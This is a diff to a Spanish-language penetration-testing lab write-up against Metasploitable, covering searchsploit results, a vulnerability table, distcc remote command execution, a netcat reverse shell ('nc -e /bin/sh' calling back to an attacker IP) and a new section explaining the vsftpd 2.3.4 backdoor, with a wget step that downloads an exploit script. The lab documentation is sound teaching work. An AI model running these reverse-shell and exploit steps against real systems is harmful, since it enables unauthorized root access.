@@ -148,7 +148,7 @@ searchsploit -x --nmap results.xml
 <img width="1365" height="595" alt="image" src="https://github.com/user-attachments/assets/1a370be2-17c3-45ba-907f-b9703b049a3f" />
 Para vsftpd 2.3.4 se encontraron dos exploits directamente relevantes:
 |Exploit|Path|
-|-|-|-|
+|-|-|
 |vsftpd 2.3.4 – Backdoor Command Execution|unix/remote/49757.py|
 |vsftpd 2.3.4 – Backdoor Command Execution (Metasploit)|unix/remote/17491.rb|
 
@@ -165,9 +165,10 @@ nmap -sV -p53,6000,111,139,25,23,21,22,445,514,513,512,80,\
 |-|-|-|-|-|
 |21/tcp|vsftpd 2.3.4|CVE-2011-2523|10.0|VULNERABLE|
 |3632/tcp|distccd v1|CVE-2004-2687|9.3|VULNERABLE|
-|1099/tcp|Java RMI|-|Alta|VULNERABLE|
+|1099/tcp|Java RMI| |Alta|VULNERABLE|
 |5432/tcp|PostgreSQL|CVE-2014-0224|Alta|VULNERABLE|
 |25/tcp|SMTP|CVE-2014-3566|Media|Vulnerable|
+
 ## Detalle: distcc CVE-2004-2687
 El script NSE *distcc-cve2004-2687* confirmó que el servicio distcc en el puerto 3632 permite ejecutar comandos arbitrarios de forma remota sin autenticación. La prueba de concepto interna ejecutó *id* y obtuvo respuesta:
 ```bash
@@ -235,9 +236,19 @@ El comando *nc -e /bin/sh* ordena a netcat que ejectute */bin/sh* y conecte su e
 connect to [192.168.124.128] from (UNKNOWN) [192.168.124.133] 35902
 ```
 <img width="1365" height="717" alt="image" src="https://github.com/user-attachments/assets/9de97f0d-bb9a-474d-94e1-7647c6ecc88e" />
-## 5.4 Confirmación de acceso
-Una vez establecida la conexión, se confirmó ejecución de comandos en la máquina víctima:
-
 
 # Fase 6: Explotación vsFTPD 2.3.4 CVE-211
+## ¿Qué es este backdoor?
+En 2011, un atacante desconocido comprometió el repositorio oficial de vsFTPd e introdujo un backdoor en la versión 2.3.4. El mecanismo es simple: si el nombre de usuario contiene la cadena *:)* durante el login FTP, el servidor abre automáticamente una shell en el puerto 6200 con privilegios de root. Fue descubierto y removido rápidamente, pero Metasploitable lo incluye intencionalmente.
+- CVE: CVE-2011-2523
+- CVSS: 10.0 (máximo)
+- Privilegios obtenidos: root (uid=0)
+## 6.1 Descargar y preparar el exploit 
+```bash
+wget https://gist.githubusercontent.com/thaisingle/e2af5a83f06dc91\
+fdf60faa23f43ffec/raw/ba8505125ccd2f9ae30c56903f2e817aa96b1854/\
+vsFtpdBackdoor.py
+
+chmod +x vsFtpdBackdoor.py
+```
 # Conclusiones y lecciones aprendidas
